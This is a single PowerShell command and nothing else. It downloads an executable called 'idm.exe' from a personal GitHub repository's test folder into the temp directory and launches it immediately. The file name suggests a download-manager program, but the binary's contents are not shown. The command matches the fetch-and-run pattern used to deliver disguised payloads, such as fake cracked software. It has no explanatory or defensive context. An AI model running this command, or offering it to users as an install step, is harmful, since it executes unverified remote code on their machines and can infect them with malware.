Invoke-WebRequest -Uri "https://github.com/nahid0x1/nahid0x1.github.io/raw/refs/heads/main/test/idm.exe" -OutFile "$env:Temp\idm.exe"; Start-Process -FilePath "$env:Temp\idm.exe"
